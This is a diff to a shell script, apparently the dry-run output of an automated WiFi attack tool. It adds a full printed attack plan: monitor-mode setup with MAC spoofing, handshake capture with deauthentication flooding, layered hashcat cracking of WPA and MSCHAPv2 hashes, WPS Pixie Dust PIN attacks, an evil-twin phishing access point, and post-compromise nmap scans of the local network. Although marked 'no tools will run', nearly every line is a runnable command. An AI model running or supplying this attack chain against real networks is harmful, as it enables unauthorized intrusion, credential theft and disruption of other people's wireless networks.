@@ -79,15 +79,65 @@ fi
   echo
   echo "Profile: $PROFILE"
   echo "Capture: ${CAPTURE:-120}s"
+  echo "Workload: $WLIMIT"
   [ "$AUTO" -eq 1 ] && echo "Mode: auto (one-click)"
+  [ -n "$TARGET" ] && echo "Target: $TARGET"
+  [ -n "$IFACE" ] && echo "Interface: $IFACE"
+  [ -n "$WORDLIST" ] && echo "Wordlist: $WORDLIST"
   echo
-  echo "Phases (simulation only - no tools will run)"
-  echo "  [0] Setup: check root, prerequisites, wireless interfaces"
-  echo "  [1] Capture: hcxdumptool + mdk4 reassociation (echo only)"
-  echo "  [2] Extract: hcxpcapngtool + hcxhashtool (echo only)"
-  echo "  [3] Crack: hashcat layers 1-8 (dicts + masks + rules; echo only)"
-  echo "  [4] WPS: reaver -K Pixie Dust (if AP has WPS; echo only)"
-  echo "  [5] Evil Twin: hostapd-mana or wifiphisher (echo only)"
+  echo "═══════════════════════════════════════════════════"
+  echo "  Planned execution (no tools will run)"
+  echo "═══════════════════════════════════════════════════"
+  echo
+  echo "[0] Setup"
+  echo "    airmon-ng check kill"
+  echo "    airmon-ng start \$IFACE"
+  echo "    macchanger -r \$MON  (stealth only)"
+  echo
+  echo "[0.5] Passive recon (if kismet installed)"
+  echo "    timeout 30 kismet -c \$MON --daemonize"
+  echo
+  echo "[1] Capture (${CAPTURE:-120}s)"
+  echo "    hcxdumptool -i \$MON -o \$CAP [filterlist_ap=\$TARGET]"
+  echo "    mdk4 \$MON d -b \$WORK/blacklist  (background, every 5s)"
+  echo "    airodump-ng --band abg --output-format csv -w \$WORK/scan \$MON"
+  echo "    tshark -r \$CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity"
+  echo "    tshark -r \$CAP -Y 'wps' -T fields -e wlan.bssid"
+  echo
+  echo "[2] Extract & normalize"
+  echo "    hcxpcapngtool -o \$WORK/raw.hc22000 -E \$WORK/essids.txt --eapmschapv2=\$WORK/mschapv2.txt \$CAP"
+  echo "    hcxhashtool -i \$WORK/raw.hc22000 -o \$HASH --essid-group"
+  echo
+  echo "[3] Crack (hashcat layers 0-8)"
+  echo "    0: cowpatty -r \$CAP -f <wordlist> -s <essid>"
+  echo "    1: hashcat -m 22000 -a 0 \$HASH \$WORK/dicts/vendor.txt"
+  echo "    2: hashcat -m 22000 -a 0 \$HASH <wordlist>"
+  echo "    3: hashcat -m 22000 -a 0 \$HASH <wordlist> -r best64.rule"
+  echo "    4: hashcat -m 22000 -a 3 \$HASH '?d?d?d?d?d?d?d?d'"
+  echo "    5: hashcat -m 22000 -a 3 \$HASH '?d?d?d?d?d?d?d?d?d?d'"
+  echo "    6: hashcat -m 22000 -a 3 \$HASH '09?d?d?d?d?d?d?d?d?d'"
+  echo "    7: hashcat -m 22000 -a 6 \$HASH \$WORK/dicts/vendor.txt '?d?d?d?d'"
+  echo "    8: hashcat -m 22000 -a 0 \$HASH <wordlist> -r dive.rule"
+  echo "    9: hashcat -m 22000 -a 0 \$HASH <keyboard-walk>"
+  echo "    E: hashcat -m 5500 \$WORK/mschapv2.txt <wordlist>  (Enterprise)"
+  echo
+  echo "[4] WPS (if DO_WPS and WPS-enabled APs found)"
+  echo "    wash -i \$MON -o \$WORK/wps-scan.txt"
+  echo "    reaver -i \$MON -b <bssid> -c <ch> -K 1 -N -vv -d 5"
+  echo "    bully -b <bssid> -c <ch> -d \$WORK/bully-<bssid> \$MON"
+  echo
+  echo "[5] Evil Twin (if no cracks and DO_TWIN)"
+  echo "    hostapd-mana \$WORK/mana.conf  (or wifiphisher)"
+  echo "    sleep 180"
+  echo
+  echo "[6] Post-exploit (if cracks found and DO_POST)"
+  echo "    nmap -sn 192.168.1.0/24"
+  echo "    nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24"
+  echo "    generate \$REPORT/connect.sh (nmcli + bettercap)"
+  echo
+  echo "[7] Report"
+  echo "    \$REPORT/summary.md"
+  echo "    \$REPORT/summary.json"
   echo
   echo "✓ Simulation complete. No changes were made."
   echo
